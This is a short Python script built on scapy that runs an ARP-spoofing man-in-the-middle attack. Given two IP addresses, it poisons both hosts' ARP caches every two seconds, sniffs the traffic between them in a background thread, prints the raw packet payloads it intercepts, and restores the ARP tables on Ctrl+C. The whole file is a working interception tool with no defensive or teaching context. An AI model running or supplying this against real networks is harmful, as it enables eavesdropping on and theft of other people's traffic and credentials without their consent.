from scapy.all import *
import sys
import signal


def get_mac(ip):
    """
    Send a ARP request to get the MAC address of the target IP.
    """
    answered, _ = sr(ARP(pdst=ip), timeout=2, retry=3, verbose=0)
    for _, packet in answered:
        return packet.hwsrc
    return None

def spoof_arp(target_ip, spoof_ip, target_mac):
    """
    Send an ARP response to the target IP with the spoofed IP.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore_arp(dst_ip, src_ip, dst_mac, src_mac):
    """Restore ARP tables to their original state"""
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=3, verbose=0)


def packet_callback(packet):
    """
    Print intercepted packets.
    """
    if IP in packet and packet.haslayer(Raw):
        print(f"Received traffic from {packet[IP].src} to {packet[IP].dst}: {packet[Raw].load}")



def main():
    if len(sys.argv) != 3:
        print("Usage: python3 spoof_arp.py <IP1> <IP2>")
        sys.exit(1)

    # Get the ip addresses from command line arguments
    ip1 = sys.argv[1]
    ip2 = sys.argv[2]

    # get the MAC address of the target IP
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    if mac1 is None or mac2 is None:
        print(f"Could not find MAC address for {ip1} or {ip2}.")
        sys.exit(1)

    def stop(signal, frame):
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        restore_arp(ip1, ip2, mac1, mac2)
        restore_arp(ip2, ip1, mac2, mac1)
        print("[+] ARP tables restored. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop)

    # Start sniffing in a background thread
    sniff_thread = threading.Thread(
        target=sniff,
        kwargs={"filter": f"ip host {ip1} or ip host {ip2}", "prn": packet_callback, "store": 0}
    )
    sniff_thread.start()

    while True:
        spoof_arp(ip1, ip2, mac1)
        spoof_arp(ip2, ip1, mac2)
        time.sleep(2)

if __name__ == "__main__":
    main()
